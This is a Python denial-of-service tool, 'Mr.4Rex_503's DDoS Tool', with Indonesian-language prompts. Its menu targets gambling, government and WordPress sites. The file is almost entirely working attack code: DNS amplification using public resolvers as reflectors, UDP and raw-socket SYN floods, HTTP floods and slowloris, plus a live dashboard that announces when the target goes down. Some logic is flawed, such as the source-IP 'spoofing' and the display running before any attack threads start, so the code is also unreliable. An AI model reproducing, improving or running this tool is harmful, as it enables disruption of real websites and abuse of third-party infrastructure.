import threading
import socket
import random
import time
import http.client
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import urlparse
import datetime
import os
import sys
import struct
import select
import curses

class DDoSChaos:
    def __init__(self):
        self.bytes_sent = 0
        self.packets_sent = 0
        self.amplified_bytes = 0
        self.lock = threading.Lock()
        self.target_down = False
        self.attack_running = False
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1"
        ]
        self.payloads = [
            random._urandom(1024),
            random._urandom(2048),
            random._urandom(4096)
        ]
        self.dns_servers = [
            "8.8.8.8",  # Google DNS
            "1.1.1.1",  # Cloudflare DNS
            "208.67.222.222",  # OpenDNS
        ]

    def clear_screen(self):
        os.system('cls' if os.name == 'nt' else 'clear')

    def get_ip_from_url(self, url):
        try:
            parsed = urlparse(url)
            host = parsed.netloc or url
            return socket.gethostbyname(host)
        except:
            return None

    def check_target_status(self, target_url):
        parsed = urlparse(target_url)
        host = parsed.netloc or target_url
        try:
            conn = http.client.HTTPConnection(host, timeout=1)
            conn.request("HEAD", "/")
            response = conn.getresponse()
            conn.close()
            return response.status < 400
        except:
            return False

    def dns_amplification(self, target_ip, duration):
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        end_time = time.time() + duration
        dns_query = b"\x00\x01\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x07example\x03com\x00\x00\x01\x00\x01"
        while time.time() < end_time and self.attack_running:
            try:
                dns_server = random.choice(self.dns_servers)
                sock.sendto(dns_query, (dns_server, 53))
                # Spoof source IP to target IP
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                sock.bind((target_ip, 0))
                sent_bytes = len(dns_query)
                amplified_bytes = sent_bytes * 50  # Amplifikasi bisa sampe 50x
                with self.lock:
                    self.bytes_sent += sent_bytes
                    self.amplified_bytes += amplified_bytes
                    self.packets_sent += 1
            except:
                pass
        sock.close()

    def udp_flood(self, target_ip, port, duration):
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        end_time = time.time() + duration
        while time.time() < end_time and self.attack_running:
            try:
                payload = random.choice(self.payloads)
                sock.sendto(payload, (target_ip, port))
                with self.lock:
                    self.bytes_sent += len(payload)
                    self.packets_sent += 1
            except:
                pass
        sock.close()

    def syn_flood(self, target_ip, port, duration):
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        end_time = time.time() + duration
        while time.time() < end_time and self.attack_running:
            try:
                ip_header = struct.pack("!BBHHHBBH4s4s", 69, 0, 40, random.randint(1, 65535), 0, 64, 6, 0, 
                                       socket.inet_aton("0.0.0.0"), socket.inet_aton(target_ip))
                tcp_header = struct.pack("!HHLLBBHHH", random.randint(1024, 65535), port, random.randint(1, 4294967295), 
                                        0, 2, 4, 5840, 0, 0)
                packet = ip_header + tcp_header
                sock.sendto(packet, (target_ip, 0))
                with self.lock:
                    self.bytes_sent += len(packet)
                    self.packets_sent += 1
            except:
                pass
        sock.close()

    def http_flood(self, target_url, duration):
        parsed = urlparse(target_url)
        host = parsed.netloc or target_url
        end_time = time.time() + duration
        while time.time() < end_time and self.attack_running:
            try:
                conn = http.client.HTTPConnection(host, timeout=1)
                conn.request("GET", "/", headers={
                    "User-Agent": random.choice(self.user_agents),
                    "Connection": "keep-alive",
                    "Cache-Control": "no-cache",
                    "Accept": "*/*",
                    "Accept-Encoding": "gzip, deflate, br",
                    "Accept-Language": "en-US,en;q=0.9"
                })
                response = conn.getresponse()
                sent = len(response.read())
                with self.lock:
                    self.bytes_sent += sent
                    self.packets_sent += 1
                conn.close()
            except:
                pass

    def slowloris(self, target_url, duration):
        parsed = urlparse(target_url)
        host = parsed.netloc or target_url
        end_time = time.time() + duration
        sockets = []
        while time.time() < end_time and self.attack_running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(4)
                s.connect((host, 80))
                s.send(f"GET /?{random.randint(0, 2000)} HTTP/1.1\r\n".encode())
                s.send(f"Host: {host}\r\n".encode())
                s.send(f"User-Agent: {random.choice(self.user_agents)}\r\n".encode())
                s.send("Accept-language: en-US,en,q=0.5\r\n".encode())
                sockets.append(s)
            except:
                pass
            for s in list(sockets):
                try:
                    s.send(f"X-a: {random.randint(1, 5000)}\r\n".encode())
                    with self.lock:
                        self.bytes_sent += len(f"X-a: {random.randint(1, 5000)}\r\n".encode())
                        self.packets_sent += 1
                except:
                    sockets.remove(s)
            time.sleep(0.1)
        for s in sockets:
            s.close()

    def display_table(self, stdscr, target_url, duration, threads):
        curses.curs_set(0)  # Hide cursor
        start_time = time.time()
        log_lines = []
        while self.attack_running and (time.time() - start_time) < duration:
            current_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            target_status = self.check_target_status(target_url)
            with self.lock:
                bytes_sent = self.bytes_sent
                packets_sent = self.packets_sent
                amplified_bytes = self.amplified_bytes
            if not target_status and not self.target_down:
                self.target_down = True
                log_lines.append(f"💥 TARGET DOWN DETECTED at {current_time}! 💥")

            stdscr.clear()
            # Header yang stay
            stdscr.addstr(0, 0, "╔════════════════════════════════════════════════════════════╗")
            stdscr.addstr(1, 0, "║              😈 Mr.4Rex_503's DDoS Tool 😈                ║")
            stdscr.addstr(2, 0, "╚════════════════════════════════════════════════════════════╝")
            stdscr.addstr(3, 0, f"Target: {target_url}")
            stdscr.addstr(4, 0, f"Status: {'DOWN' if self.target_down else 'UP'}")
            stdscr.addstr(5, 0, f"Threads: {threads}")
            stdscr.addstr(6, 0, f"Time: {current_time}")
            stdscr.addstr(7, 0, "┌─────────────────────┬─────────────────────────┬──────────────────┬──────────────────┬──────────────┐")
            stdscr.addstr(8, 0, "│ Timestamp           │ Bytes Sent              │ Amplified Bytes  │ Packets Sent     │ Target Status│")
            stdscr.addstr(9, 0, "├─────────────────────┼─────────────────────────┼──────────────────┼──────────────────┼──────────────┤")

            # Data yang nambah ke bawah
            log_lines.append(f"│ {current_time} │ {bytes_sent} bytes       │ {amplified_bytes} bytes │ {packets_sent} packets │ {'DOWN' if self.target_down else 'UP'}      │")
            max_lines = curses.LINES - 11  # Space buat header sama footer
            for i, line in enumerate(log_lines[-max_lines:]):
                stdscr.addstr(10 + i, 0, line)
            stdscr.addstr(10 + min(len(log_lines), max_lines), 0, "└─────────────────────┴─────────────────────────┴──────────────────┴──────────────────┴──────────────┘")

            stdscr.refresh()
            time.sleep(1)

    def attack(self, target_url, duration, threads):
        target_ip = self.get_ip_from_url(target_url)
        if not target_ip:
            print("URL ga valid, bro!")
            return

        self.attack_running = True
        self.bytes_sent = 0
        self.packets_sent = 0
        self.amplified_bytes = 0
        self.target_down = False

        print(f"🚀 Mulai nyerang {target_url} ({target_ip}) dengan {threads} threads selama {duration} detik! 😈")
        
        curses.wrapper(self.display_table, target_url, duration, threads)

        with ThreadPoolExecutor(max_workers=threads) as executor:
            for _ in range(threads // 5):
                executor.submit(self.dns_amplification, target_ip, duration)
                executor.submit(self.udp_flood, target_ip, random.randint(1, 65535), duration)
                executor.submit(self.syn_flood, target_ip, random.randint(1, 65535), duration)
                executor.submit(self.http_flood, target_url, duration)
                executor.submit(self.slowloris, target_url, duration)

        self.attack_running = False
        self.clear_screen()
        print(f"💥 Serangan ke {target_url} selesai! Target {'DOWN' if self.target_down else 'UP'}! 😈")

    def main(self):
        while True:
            self.clear_screen()
            print("╔════════════════════════════════════╗")
            print("║   😈 Mr.4Rex_503's DDoS Tool 😈   ║")
            print("╚════════════════════════════════════╝")
            print("\nPilih target buat dihajar:")
            print("1. Situs Slot 🎰")
            print("2. Situs Negara 🏛️")
            print("3. WordPress 📝")
            print("4. Keluar 🚪")
            choice = input("Masukin pilihan (1-4): ")

            if choice == '4':
                print("Sampai jumpa, Bro Tetep bikin chaos, bro! 😈")
                break

            if choice not in ['1', '2', '3']:
                print("Pilihan ga valid, bro! Coba lagi.")
                time.sleep(2)
                continue

            target_url = input("Masukin URL target (contoh: http://example.com): ")
            try:
                duration = int(input("Berapa lama serangan (detik): "))
                threads = int(input("Berapa banyak threads (1-1000): "))
                if threads > 1000 or threads < 1:
                    print("Threads harus antara 1-1000, bro!")
                    time.sleep(2)
                    continue
                if duration < 1:
                    print("Durasi harus lebih dari 0 detik, bro!")
                    time.sleep(2)
                    continue
            except ValueError:
                print("Input ga valid, bro! Harus angka.")
                time.sleep(2)
                continue

            self.attack(target_url, duration, threads)
            input("Tekan Enter buat lanjut...")

if __name__ == "__main__":
    app = DDoSChaos()
    app.main()
